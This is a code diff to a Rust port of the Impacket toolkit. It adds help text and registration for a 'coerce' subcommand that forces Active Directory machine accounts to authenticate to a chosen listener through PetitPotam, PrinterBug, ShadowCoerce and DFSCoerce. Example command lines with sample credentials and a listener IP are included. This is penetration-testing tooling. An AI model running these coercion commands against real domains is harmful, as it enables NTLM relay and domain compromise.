@@ -455,6 +455,36 @@ examples:
   impacket-rs describeTicket admin.ccache
   impacket-rs describeTicket ticket.kirbi
 "#),
+        "coerce" => Some(r#"Description: Active Directory authentication coercion suite covering MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce), and MS-DFSNM (DFSCoerce).
+
+usage: impacket-rs coerce [options] -listener <LISTENER> <target>
+
+positional arguments:
+  target: [[domain/]username[:password]@]<targetName or address>
+
+options:
+  -h, --help            show this help message and exit
+  -listener <LISTENER>  Listener host/IP to coerce machine account authentication to
+  -method <METHOD>      Coercion method: all, efsr, rprn, fsrvp, dfsnm (default: all)
+  -share <SHARE>        Share name for DFS / FSRVP (default: test)
+  -pipe <PIPE>          Named pipe override for EFSR (default: efsrpc, fallback to lsarpc, samr)
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+  -no-pass              don't ask for password (useful for -k)
+  -k                    Use Kerberos authentication. Grabs credentials from
+                        ccache file (KRB5CCNAME)
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+  -dc-ip ip address     IP Address of the domain controller
+  -target-ip ip address IP Address of the target machine
+  -port port            Destination port to connect to
+
+examples:
+  impacket-rs coerce corp.local/jdoe:Pass123!@dc01 -listener 192.168.1.50
+  impacket-rs coerce corp.local/jdoe:Pass123!@dc01 -listener 192.168.1.50 -method rprn
+  impacket-rs coerce corp.local/jdoe:Pass123!@dc01 -listener 192.168.1.50 -method efsr
+"#),
         "dfsclient" => Some(r#"Description: Active Directory DFS Namespace management and referral query tool ([MS-DFSNM] over \PIPE\netdfs).
 
 usage: impacket-rs dfsclient [options] <target>
@@ -1847,6 +1877,7 @@ pub fn canonicalize_name(name: &str) -> &'static str {
         "dnstool" => "dnstool",
         "ldapsearch" => "ldapsearch",
         "ldapclient" => "ldapclient",
+        "coerce" => "coerce",
         "dfsclient" => "dfsclient",
         "getarch" => "getArch",
         "machinerole" => "machine_role",
@@ -1929,7 +1960,7 @@ mod tests {
             "netview", "reg", "services", "mssqlclient", "GetADUsers",
             "GetADComputers", "GetLAPSPassword", "CheckLDAPStatus", "addcomputer",
             "dacledit", "owneredit", "dnstool", "ldapsearch", "ldapclient",
-            "dfsclient", "getArch", "machine_role", "oxidquery", "samedit",
+            "coerce", "dfsclient", "getArch", "machine_role", "oxidquery", "samedit",
             "changepasswd", "Get-GPPPassword", "net", "wmiquery", "wmipersist",
             "wspsearch", "rdp_check", "registry-read", "tstool", "ping",
             "tracer", "sniffer", "mqtt_check", "klist", "attrib", "filetime",
